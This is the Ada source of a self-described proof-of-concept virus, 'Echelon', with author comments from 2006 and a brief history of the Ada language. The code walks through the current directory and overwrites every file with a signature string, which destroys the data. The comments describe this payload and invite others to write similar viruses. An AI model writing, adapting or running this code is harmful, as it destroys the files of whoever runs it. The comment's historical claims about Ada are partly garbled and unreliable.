with ada.text_io, gnat.directory_operations, gnat.os_lib;
use ada.text_io, gnat.directory_operations, gnat.os_lib;

procedure echelon is

   Dir       : Dir_Type;
   DirName   : string( 1..80 );
   Len       : natural;
   FD	     : File_Descriptor;
   VString   : constant string := "[AdA] PoC by SkyOut [Echelon Virus]";
   Written   : integer;

begin

   Open( Dir, "." );

   loop
   	Read( Dir, DirName, Len );
   exit when Len = 0;
   	FD := Create_File( DirName( 1..Len ), Text );
   	written := Write( FD, VString'address, VString'Length );
   end loop;

   Close( Dir );

end echelon;

--======================================================================================================
--======================================================================================================

-- Author: SkyOut
-- Date: 10.August 2006
-- Website: www.eof-project.net
-- Coded/Tested under Ubuntu Linux with " gnat " (compiler) and " gps " (IDE) 
-- Payload: Overwrites files in current directory with specified " VString "

--======================================================================================================
--======================================================================================================

--I am not really sure, but I have not seen any Ada virus before, maybe because this language
--is not really fun to code... Many things have to be done over variables and you have to be really sure
--about return values and more... Well in the end I did this little PoC for Ada, called " Echelon ".
--Maybe in the future some more stuff will follow, we'll see and even better: maybe some others start
--trying a bit around with it now :)

--======================================================================================================
--======================================================================================================

--Information (very short^^) about Ada:

--The programming language Ada has been developed by Honeywell Bull in the 1970s and was used / supporterted by the
--US Departmend of Defense (DoD). The main versions of Ada were Ada83 followed by Ada95, it is one of the first
--high level languages and was often used for security related projects (example: DoD). The name Ada belongs to
--the software engineer Lady Ada Lovelace (1815-1852).
